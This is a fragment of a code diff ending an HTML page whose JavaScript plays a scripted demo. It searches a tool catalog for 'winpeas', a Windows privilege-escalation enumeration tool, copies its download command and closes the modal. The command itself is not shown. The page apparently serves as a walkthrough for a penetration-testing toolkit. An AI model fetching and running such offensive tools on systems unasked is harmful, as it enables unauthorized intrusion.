+  await clickIfr('#tcat-q',0,0,0);
+  await typeIfr('#tcat-q','winpeas',65);
+  await wait(500);
+
+  // Move cursor to first download command and click → ✅ Copied! flash
+  await gotoIfr('#tcat-grid pre.cmd',0,0,400);
+  await wait(180);
+  await clickIfr('#tcat-grid pre.cmd',0,0,0);
+  await wait(1200); // green border + ✅ Copied! visible
+
+  // Close modal
+  await gotoIfr('#tools-modal .modal-close',0,0,360);
+  await clickIfr('#tools-modal .modal-close',0,0,0);
+  await wait(380);
+
+  setProgress(100);
+  await wait(700);
+
+  run();
+}
+
+run();
+</script>
+</body>
+</html>
